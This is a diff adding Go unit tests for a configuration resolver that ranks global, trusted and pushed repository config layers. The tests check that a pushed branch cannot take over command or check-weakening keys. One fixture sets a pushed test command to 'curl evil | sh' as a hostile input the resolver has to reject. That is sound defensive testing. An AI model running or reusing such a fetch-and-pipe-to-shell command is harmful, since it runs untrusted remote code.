@@ -464,3 +464,158 @@ func keyStrings(keys []Key) []string {
 	}
 	return out
 }
+
+// resolveRun is ResolveRun with a fatal on error, mirroring resolve above.
+func resolveRun(t *testing.T, global, trusted, pushed Layer) Resolution {
+	t.Helper()
+	res, err := ResolveRun(global, trusted, pushed)
+	if err != nil {
+		t.Fatalf("ResolveRun: %v", err)
+	}
+	return res
+}
+
+// The three-document composition applies PRD section 10's trust diagram whole:
+// the pushed copy wins the keys a contributor may set, the trusted copy wins
+// the keys that execute or demand, and each dropped key is reported.
+func TestResolveRunComposesTheThreeDocumentsByTrustClass(t *testing.T) {
+	principles.Cite(t, principles.P7)
+	global := mustParse(t, OriginGlobal, `{
+		"commands": {"test": "global test"},
+		"checks_timeout": "24h"
+	}`)
+	trusted := mustParse(t, OriginTrusted, `{
+		"commands": {"test": "trusted test", "lint": "trusted lint"},
+		"agent": "claude",
+		"fix_rounds": {"review": 1},
+		"no_ci": true,
+		"ignore_patterns": ["gen/**"]
+	}`)
+	pushed := mustParse(t, OriginPushed, `{
+		"commands": {"test": "curl evil | sh"},
+		"agent": "hostile",
+		"fix_rounds": {"review": 0},
+		"ignore_patterns": ["vendor/**"],
+		"no_ci": false
+	}`)
+	res := resolveRun(t, global, trusted, pushed)
+	c := res.Config
+
+	// The keys a pushed branch may set are the pushed copy's.
+	if c.FixRounds.Review != 0 {
+		t.Errorf("FixRounds.Review = %d, want the pushed 0", c.FixRounds.Review)
+	}
+	if !c.IgnorePatterns.Matches("vendor/a.go") || c.IgnorePatterns.Matches("gen/a.go") {
+		t.Errorf("IgnorePatterns = %v, want the pushed list replacing the trusted one", c.IgnorePatterns)
+	}
+	// The keys that execute are the trusted copy's, over the global layer.
+	if c.Commands.Test != "trusted test" || c.Commands.Lint != "trusted lint" {
+		t.Errorf("Commands = %+v, want the trusted copy's", c.Commands)
+	}
+	if strings.Join(c.Agent, ",") != "claude" {
+		t.Errorf("Agent = %v, want the trusted copy's", c.Agent)
+	}
+	// The keys that weaken a check are the trusted copy's, whatever the pushed
+	// copy says.
+	if !c.NoCI {
+		t.Error("NoCI = false; the trusted declaration must win over the pushed copy's retraction")
+	}
+	// Global-only keys are untouched by either repository copy.
+	if c.ChecksTimeout != 24*time.Hour {
+		t.Errorf("ChecksTimeout = %v, want the global 24h", c.ChecksTimeout)
+	}
+
+	rejected := map[Key]Origin{}
+	for _, r := range res.Rejected {
+		rejected[r.Key] = r.Origin
+	}
+	for _, k := range []Key{KeyCommandsTest, KeyAgent, KeyNoCI} {
+		if origin, ok := rejected[k]; !ok || origin != OriginPushed {
+			t.Errorf("the pushed %s was dropped without a rejection naming the pushed layer: %v", k, res.Rejected)
+		}
+	}
+	if _, ok := rejected[KeyFixRoundsReview]; ok {
+		t.Errorf("the pushed fix_rounds.review was rejected although a pushed branch may set it: %v", res.Rejected)
+	}
+}
+
+// The opt-out is honored from the trusted copy and from the global layer, and
+// the pushed copy cannot enable it for itself.
+func TestResolveRunHonoursTheOptOutFromTheTrustedCopyOnly(t *testing.T) {
+	principles.Cite(t, principles.P7)
+	pushed := mustParse(t, OriginPushed, `{"commands": {"test": "make test"}, "allow_pushed_commands": true}`)
+
+	t.Run("the pushed copy cannot enable itself", func(t *testing.T) {
+		c := resolveRun(t, Absent(OriginGlobal), Absent(OriginTrusted), pushed).Config
+		if c.Commands.Test != "" {
+			t.Errorf("Commands.Test = %q; the opt-out was honored from the pushed copy", c.Commands.Test)
+		}
+	})
+	t.Run("the trusted copy enables it", func(t *testing.T) {
+		trusted := mustParse(t, OriginTrusted, `{"allow_pushed_commands": true}`)
+		c := resolveRun(t, Absent(OriginGlobal), trusted, pushed).Config
+		if c.Commands.Test != "make test" {
+			t.Errorf("Commands.Test = %q, want the pushed command under the trusted opt-out", c.Commands.Test)
+		}
+	})
+	t.Run("the global layer enables it", func(t *testing.T) {
+		global := mustParse(t, OriginGlobal, `{"allow_pushed_commands": true}`)
+		c := resolveRun(t, global, Absent(OriginTrusted), pushed).Config
+		if c.Commands.Test != "make test" {
+			t.Errorf("Commands.Test = %q, want the pushed command under the global opt-out", c.Commands.Test)
+		}
+	})
+	t.Run("the trusted copy can turn a global opt-out off", func(t *testing.T) {
+		global := mustParse(t, OriginGlobal, `{"allow_pushed_commands": true}`)
+		trusted := mustParse(t, OriginTrusted, `{"allow_pushed_commands": false}`)
+		c := resolveRun(t, global, trusted, pushed).Config
+		if c.Commands.Test != "" {
+			t.Errorf("Commands.Test = %q; the trusted copy could not withdraw the opt-out", c.Commands.Test)
+		}
+	})
+}
+
+// ResolveRun refuses a layer standing in another's position, so a caller
+// cannot hand the pushed copy the trusted copy's standing by argument order.
+func TestResolveRunRefusesLayersInTheWrongPosition(t *testing.T) {
+	principles.Cite(t, principles.P7)
+	cases := []struct {
+		name                    string
+		global, trusted, pushed Layer
+		want                    error
+	}{
+		{"pushed in the trusted position", Absent(OriginGlobal), Absent(OriginPushed), Absent(OriginPushed), ErrNotRepositoryLayer},
+		{"trusted in the pushed position", Absent(OriginGlobal), Absent(OriginTrusted), Absent(OriginTrusted), ErrNotRepositoryLayer},
+		{"repository file in the global position", Absent(OriginTrusted), Absent(OriginTrusted), Absent(OriginPushed), ErrNotGlobalLayer},
+		{"a layer with no origin", Layer{}, Absent(OriginTrusted), Absent(OriginPushed), ErrUnknownOrigin},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			if _, err := ResolveRun(c.global, c.trusted, c.pushed); !errors.Is(err, c.want) {
+				t.Fatalf("ResolveRun = %v, want %v", err, c.want)
+			}
+		})
+	}
+}
+
+// Resolve is ResolveRun's projection onto one repository copy, so the two
+// cannot drift: a single-layer resolution answers exactly as the composition
+// does with the other copy absent.
+func TestResolveIsResolveRunWithTheOtherCopyAbsent(t *testing.T) {
+	global := mustParse(t, OriginGlobal, `{"commands": {"test": "global test"}}`)
+	trusted := mustParse(t, OriginTrusted, `{"commands": {"test": "trusted test"}, "no_ci": true}`)
+	pushed := mustParse(t, OriginPushed, `{"commands": {"test": "pushed test"}, "ignore_patterns": ["v/**"]}`)
+
+	one := resolve(t, global, trusted)
+	two := resolveRun(t, global, trusted, Absent(OriginPushed))
+	if one.Config.Commands.Test != two.Config.Commands.Test || one.Config.NoCI != two.Config.NoCI {
+		t.Errorf("a trusted-only Resolve answered %+v and ResolveRun %+v", one.Config, two.Config)
+	}
+
+	one = resolve(t, global, pushed)
+	two = resolveRun(t, global, Absent(OriginTrusted), pushed)
+	if one.Config.Commands.Test != two.Config.Commands.Test || len(one.Rejected) != len(two.Rejected) {
+		t.Errorf("a pushed-only Resolve answered %+v (%v) and ResolveRun %+v (%v)",
+			one.Config, one.Rejected, two.Config, two.Rejected)
+	}
+}
